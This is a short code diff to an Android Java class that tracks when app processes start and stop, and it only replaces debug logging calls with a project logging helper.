@@ -14,12 +14,12 @@ import java.util.Iterator;
 import java.util.TreeMap;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
-import android.util.Log;
 
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.RunningProcesses;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 public class ListenerProcess extends Listener<ProcessInfo> {
 	/** The Constant TAG. */
@@ -77,7 +77,7 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 
 				currentRunning.put(running.processName, running);
 				if (!lastRunning.containsKey(running.processName)) {
-					if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): started " + running.processName);
+					if(Cfg.DEBUG) Check.log( TAG + " (notification): started " + running.processName);
 					dispatch(new ProcessInfo(running, ProcessStatus.START));
 				} else {
 					lastRunning.remove(running.processName);
@@ -87,7 +87,7 @@ public class ListenerProcess extends Listener<ProcessInfo> {
 
 		for (Iterator iter = lastRunning.keySet().iterator(); iter.hasNext();) {
 			RunningAppProcessInfo norun = (RunningAppProcessInfo) lastRunning.get(iter.next());
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
+			if(Cfg.DEBUG) Check.log( TAG + " (notification): stopped " + norun.processName);
 			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
 		}
 
